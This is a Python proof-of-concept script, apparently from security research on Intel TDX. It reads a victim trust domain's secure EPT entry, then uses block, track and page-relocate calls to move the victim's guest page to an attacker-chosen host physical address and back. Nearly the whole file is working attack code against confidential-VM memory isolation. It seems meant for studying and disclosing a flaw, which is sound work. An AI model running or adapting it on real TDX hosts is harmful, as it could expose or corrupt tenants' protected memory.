from argparse import ArgumentParser

from tdxtend import INVALID_PID, Tdxtend, TdxErrorCode
from gateway import Gateway

def remap(tdxtend: Tdxtend, gateway: Gateway, tdr_pa, gpa, hpa, orig_hpa):
  print(f"Remapping HPA={orig_hpa:#08x} --> HPA={hpa:#08x}")

  print(" --> TDH.MEM.RANGE.BLOCK")

  rc, rcx, rdx = tdxtend.call_tdh_mem_range_block(tdr_pa, gpa, 0)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print("  Error while calling TDH.MEM.RANGE.BLOCK")
    print(f"  RCX: {rcx:#x}")
    print(f"  RDX: {rdx:#x}")
    return

  print(" --> TDH.MEM.TRACK")

  rc = tdxtend.call_tdh_mem_track(tdr_pa)
  gateway.req_outside_guest_mode()

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print("Error while calling TDH.MEM.TRACK")
    return
  
  print(" --> TDH.MEM.PAGE.RELOCATE")

  rc, rcx, rdx = tdxtend.call_tdh_mem_page_relocate(tdr_pa, gpa, 0, hpa)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print("  Error while calling TDH.MEM.PAGE.RELOCATE")
    print(f"  RCX: {rcx:#x}")
    print(f"  RDX: {rdx:#x}")

    print("\nAttempting to unblock the page")

    print("\nCalling TDH.MEM.RANGE.UNBLOCK")

    rc, rcx, rdx = tdxtend.call_tdh_mem_range_unblock(tdr_pa, gpa, 0)

    if rc != TdxErrorCode.TDX_SUCCESS.value:
      print("  Error while calling TDH.MEM.RANGE.UNBLOCK")
      print(f"  RCX: {rcx:#x}")
      print(f"  RDX: {rdx:#x}")
      return


def main():
  parser = ArgumentParser(description="Initialize HPA with victim content")


  parser.add_argument(
      "--gpa",
      type=lambda x: int(x, 0),
      help="GPA of the page with which to initialize the HPA",
  )

  parser.add_argument(
      "--hpa",
      type=lambda x: int(x, 0),
      help="Target HPA",
  )

  args = parser.parse_args()

  gateway = Gateway()
  tdxtend = Tdxtend(INVALID_PID, gateway)

  # TODO: Change PID here
  tdr_pa = gateway.get_tdr_pa(INSERT_PID_HERE)
  victim_gpa = args.gpa
  target_hpa = args.hpa

  print(f"Querying GPA details")
  

  # Retrieving the current HPA corresponding to the GPA
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa, victim_gpa, 0)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print("  Error while calling TDH.MEM.SEPT.RD")
    print(f"  RCX: {rcx:#x}")
    print(f"  RDX: {rdx:#x}")
    return

  # cf. Table 3.32 of TDX module ABI
  victim_original_hpa = rcx & 0x000ffffffffff000
  # cf. Table 3.32 of TDX module ABI
  print("\n  === SEPT Entry Details ===")
  
  # ---------------------------------------------------------
  # Parse RCX (Secure EPT Entry)
  # ---------------------------------------------------------
  print(f"  Raw SEPT Entry (RCX): {rcx:#018x}")
  
  # Mask for HPA (Bits 51:12)
  orig_hpa = rcx & 0x000ffffffffff000 
  
  # EPT Permission bits: 0 (Read), 1 (Write), 2 (Execute)
  can_read = bool(rcx & 0x1)
  can_write = bool((rcx >> 1) & 0x1)
  can_execute = bool((rcx >> 2) & 0x1)
  
  print(f"  -> HPA:  {orig_hpa:#018x}")
  print(f"  -> Permissions: R:{can_read} W:{can_write} X:{can_execute}")
  
  # ---------------------------------------------------------
  # Parse RDX (Level and TDX State)
  # ---------------------------------------------------------
  print(f"\n  Raw Metadata (RDX):   {rdx:#018x}")
  
  # Level is usually in the lowest byte, State in the second byte
  entry_level = rdx & 0xFF
  tdx_state = (rdx >> 8) & 0xFF 
  
  print(f"  -> Entry Level: {entry_level}")
  print(f"  -> TDX State:   {tdx_state}")

  print()
  remap(tdxtend, gateway, tdr_pa, victim_gpa, target_hpa, victim_original_hpa)
  
  print()
  remap(tdxtend, gateway, tdr_pa, victim_gpa, victim_original_hpa, target_hpa)

if __name__ == "__main__":
  main()
